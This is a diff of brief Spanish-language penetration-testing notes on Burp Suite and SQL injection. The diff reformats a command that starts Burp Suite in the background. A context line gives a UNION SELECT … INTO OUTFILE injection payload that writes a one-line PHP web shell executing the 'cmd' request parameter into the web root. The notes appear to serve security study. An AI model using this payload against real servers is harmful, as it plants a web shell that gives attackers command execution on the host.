@@ -2,9 +2,9 @@
 
 Tags: #BurpSuite #SQLI #Explotacion #Enumeracion 
 
-
-❯ **burpsuite &> /dev/null & disown** Iniciamos el BurpSuite y lo mandamos a segundo plano
-
+```bash 
+❯ burpsuite &> /dev/null & disown                    # Iniciamos el BurpSuite y lo mandamos a segundo plano
+```
 
 - **union select "<? system($_REQUEST['cmd']) ?>" into "/var/www/html/outfile"** Podemos crear un archivo llamado Outfile que contenga un cmd que nos interpretara comandos. Despues del primer ? va php
 
